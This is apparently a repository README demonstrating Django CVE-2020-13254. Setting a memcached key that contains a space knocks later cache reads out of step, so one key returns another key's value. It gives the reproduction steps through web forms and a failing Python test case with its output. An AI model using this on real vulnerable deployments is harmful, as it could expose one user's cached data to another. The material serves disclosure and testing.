# Django CVE-2020-13254

This repository demonstrates exploitation of CVE-2020-13254 in two ways – via a
web interface and via a failing test case.

For more details visit:

<https://danpalmer.me/2020-06-07-django-memcache-vulnerability/>

### Exploiting via the web

The example provides a web interface with 2 forms, one that sets values in the
cache and the other that gets them. These are directly translated into calls to
the Django cache backend. Because the codebase does not implement any session or
authentication system, multiple uses in the same browser tab are
indistinguishable from multiple users using between machines.

To exploit:

1. Set keys of **A** and **B** to values **a** and **b**.
2. Attempt to set **C D** to value **c d**. This will error.
3. Attempt to retrieve key **A**, there will incorrectly be no result.
4. Attempt to retrieve key **B**, the result will incorrectly be **a**.

### Demo via tests

This process can be expressed as a test case as such:

```python
from django.core.cache import cache
from django.test import TestCase


class CacheTests(TestCase):
    def test_cache(self):
        cache.set('k1', 'v1')
        cache.set('k2', 'v2')
        try:
            cache.set('a b', 'v3')
        except Exception:
            pass
        self.assertEqual(
            [
              cache.get(x) for x in
              ['k2', 'k1', 'k2', 'k1', 'k2', 'k1']
            ],
            ['v2', 'v1', 'v2', 'v1', 'v2', 'v1'],
        )
```

This fails with the following error:

```
=============================================================
FAIL: test_cache (demo.tests.CacheTests)
-------------------------------------------------------------
Traceback (most recent call last):
  File "tests.py", line 30, in test_cache
    'v1',
AssertionError: Lists differ

First differing element 0:
None
'v2'

- [None, 'v2', 'v1', 'v2', 'v1', 'v2']
?  ------

+ ['v2', 'v1', 'v2', 'v1', 'v2', 'v1']
?                              ++++++

-------------------------------------------------------------
```

After the `set`, the cache results being returned are out of step with the
queries being made.
